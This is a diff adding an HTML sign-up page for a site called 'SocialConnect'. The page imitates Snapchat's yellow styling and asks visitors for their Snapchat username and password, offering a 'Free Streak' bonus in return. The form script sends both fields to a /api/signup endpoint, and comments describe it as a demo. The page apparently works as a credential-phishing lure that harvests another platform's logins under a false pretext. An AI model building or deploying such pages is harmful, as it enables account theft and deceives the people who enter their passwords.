@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SocialConnect - Sign Up</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #ffeb3b 0%, #ffc107 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(255, 235, 59, 0.3);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #ffeb3b, #ffc107);
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            margin-bottom: 15px;
+            box-shadow: 0 10px 30px rgba(255, 193, 7, 0.3);
+        }
+
+        .logo h1 {
+            color: #333;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .logo p {
+            color: #666;
+            font-size: 16px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #fff;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #ffeb3b;
+            box-shadow: 0 0 0 3px rgba(255, 235, 59, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #ffeb3b, #ffc107);
+            color: #333;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 25px rgba(255, 193, 7, 0.3);
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(255, 193, 7, 0.4);
+        }
+
+        .submit-btn:active {
+            transform: translateY(-1px);
+        }
+
+        .promo-text {
+            text-align: center;
+            margin-top: 25px;
+            padding: 20px;
+            background: linear-gradient(135deg, rgba(255, 235, 59, 0.1), rgba(255, 193, 7, 0.1));
+            border-radius: 12px;
+            border: 1px solid rgba(255, 235, 59, 0.3);
+        }
+
+        .promo-text h3 {
+            color: #333;
+            font-size: 18px;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+
+        .promo-text p {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .response {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 12px;
+            background: #f5f5f5;
+            border: 1px solid #ddd;
+            white-space: pre-wrap;
+            display: none;
+        }
+
+        .response.success {
+            background: #e8f5e8;
+            border-color: #4caf50;
+            color: #2e7d32;
+        }
+
+        .response.error {
+            background: #ffebee;
+            border-color: #f44336;
+            color: #c62828;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            .logo h1 {
+                font-size: 24px;
+            }
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(51, 51, 51, 0.3);
+            border-radius: 50%;
+            border-top-color: #333;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="logo-icon">⚡</div>
+            <h1>SocialConnect</h1>
+            <p>Join the community</p>
+        </div>
+
+        <form id="signupForm">
+            <div class="form-group">
+                <label for="name">Username</label>
+                <input type="text" id="name" name="name" required placeholder="Enter your snapchat User name">
+            </div>
+
+            <div class="form-group">
+                <label for="pass">Password</label>
+                <input type="password" id="password" name="pass" required placeholder="Enter your Passwrd ">
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">
+                Sign Up & Get Free Streak
+            </button>
+        </form>
+
+        <div class="promo-text">
+            <h3>🔥 Free Streak Bonus!</h3>
+            <p>Sign up now and get a 7-day streak head start to boost your profile and connect with more friends!</p>
+        </div>
+
+        <div id="response" class="response"></div>
+    </div>
+
+    <script>
+        document.getElementById("signupForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById("submitBtn");
+            const responseDiv = document.getElementById("response");
+            const formData = new FormData(this);
+            const jsonData = Object.fromEntries(formData.entries());
+            
+            // Show loading state
+            submitBtn.innerHTML = '<span class="loading"></span>Signing up...';
+            submitBtn.disabled = true;
+            responseDiv.style.display = 'none';
+            
+            try {
+                // Simulate API call (replace with your actual endpoint)
+                const response = await fetch("/api/signup", {
+                    method: "POST",
+                    headers: { 
+                        "Content-Type": "application/json",
+                        "Accept": "application/json"
+                    },
+                    body: JSON.stringify(jsonData)
+                });
+                
+                if (response.ok) {
+                    const result = await response.json();
+                    responseDiv.textContent = `✅ Success! Welcome ${jsonData.name}!\nStreak bonus activated!`;
+                    responseDiv.className = 'response success';
+                    this.reset();
+                } else {
+                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                }
+                
+            } catch (error) {
+                responseDiv.textContent = `❌ Error: ${error.message}\n\nNote: This is a demo form. In production, replace "/api/signup" with your actual endpoint.`;
+                responseDiv.className = 'response error';
+            } finally {
+                // Reset button state
+                submitBtn.innerHTML = 'Sign Up & Get Free Streak';
+                submitBtn.disabled = false;
+                responseDiv.style.display = 'block';
+            }
+        });
+
+        // Add some nice interactive effects
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.parentNode.style.transform = 'scale(1.02)';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.parentNode.style.transform = 'scale(1)';
+            });
+        });
+    </script>
+</body>
+</html>
